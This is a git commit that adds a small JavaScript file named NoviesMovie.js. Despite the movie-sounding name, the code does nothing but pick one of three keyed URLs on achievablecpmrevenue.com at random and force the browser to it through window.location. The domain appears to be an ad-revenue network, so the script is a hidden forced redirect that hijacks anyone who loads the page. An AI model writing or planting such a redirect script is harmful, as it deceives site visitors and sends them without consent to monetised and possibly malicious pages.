490ac3b6fd08372d1e137e383a5ed062618be069
hamidi12359 <84512667+hamidi12359@users.noreply.github.com>
2021-05-27 10:09:21 +0800

    Create NoviesMovie.js

---
+++ NoviesMovie.js
@@ -0,0 +1,7 @@
+var dataUrl = [
+  'https://www.achievablecpmrevenue.com/akcy2zkc?key=32b66534de2cfbfffba990e24523a3fb',
+  'https://www.achievablecpmrevenue.com/ds4k4x4j7?key=6cb603ae6e9edfff12e4ddd3a3d5ff71',
+  'https://www.achievablecpmrevenue.com/fev6zvvj?key=09d5b2b55d8e386c4039b7d2e8383f24'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
